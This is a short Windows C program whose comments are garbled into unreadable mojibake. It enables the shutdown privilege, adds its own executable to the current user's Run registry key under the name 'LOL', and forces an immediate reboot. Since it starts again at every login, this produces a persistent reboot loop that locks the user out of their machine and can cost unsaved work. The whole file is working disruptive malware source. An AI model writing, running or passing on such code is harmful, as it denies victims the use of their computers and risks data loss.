#include<stdio.h>
#include<windows.h>
 
int main(int argc, char**argv)
{
	//��������Ȩ��
	HANDLE hToken; 
	if(FALSE==OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken)) //�򿪵�ǰ����,����Ȩ�� 
	{
		printf("�򿪷�������ʧ�ܡ�\n");
		return 0;
	}
	//�鿴Ȩ��
	 LUID luid;
	if(FALSE==LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&luid)) //NULL�Լ�������Ȩ�� 
	{
		printf("�鿴Ȩ��ʧ�ܡ�\n");
		return 0; 
	}
	
	//�޸�Ȩ��
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount=1;
	tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	tkp.Privileges[0].Luid=luid;
	
	TOKEN_PRIVILEGES oldtkp;
	if(FALSE==AdjustTokenPrivileges(hToken,FALSE,&tkp,sizeof(tkp),NULL,0)) //FALSE�ǲ�����Ȩ�� 
	{
		printf("������Ȩʧ��");
		return 0; 
	}
	
	
	//1.��ע���(regedit )
	HKEY hKey;
	if(ERROR_SUCCESS != RegOpenKeyEx(HKEY_CURRENT_USER,(const char *)"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&hKey))
	{	//ERROR_SUCCESS����д��0����˵0��ʾ�ɹ��� 
		printf("��ע���ʧ��\n");
		return 0;
	}
	
	//2.��ȡexe·��
	TCHAR szExePath[260];
	GetModuleFileName(NULL,szExePath,260); 
	
	//3.��ע�����д���� 
	RegSetValueEx(hKey,(const char*)"LOL",0,REG_SZ,(BYTE*)szExePath,strlen(szExePath)); //REG_SZ��ʾ�ַ���������ע�������鿴���� 
	//BYTE* �� unsigned char* 
	
	//4.�ر�ע���
	RegCloseKey(hKey);
	
	//5.����
	ExitWindowsEx(EWX_REBOOT|EWX_FORCE,0); 
	 
	return 0;
}
